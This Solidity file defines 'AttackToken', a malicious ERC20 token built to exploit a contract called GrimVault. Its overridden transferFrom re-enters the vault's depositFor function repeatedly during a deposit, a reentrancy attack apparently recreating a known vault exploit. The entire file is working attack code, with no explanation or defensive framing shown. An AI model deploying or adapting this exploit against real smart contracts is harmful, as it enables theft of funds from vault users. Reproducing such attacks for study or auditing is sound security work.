pragma solidity ^0.8.0;

import "./openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./token.sol";

contract AttackToken is ERC20{
 GrimVault public target;

constructor(address payable grim) public ERC20("Attack", "ATK") { 
    target=GrimVault(grim);
    mint(address(this),100);
}


function attack() public{
    target.depositFor(address(this),10,address(this));
}

function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        approve(sender,amount);
        _transfer(sender, recipient, amount);
        if (getBalance()>= 10){ 
        target.depositFor(address(this),10,address(this));
    }
        return true;
    }    

function getBalance() public returns (uint256) {
    uint256 balance=IERC20(address(this)).balanceOf(address(this));
    return balance;

}
function mint(address account, uint256 amount) public {
        _mint(account, amount);
    }
    
receive() external payable {
    
}


}
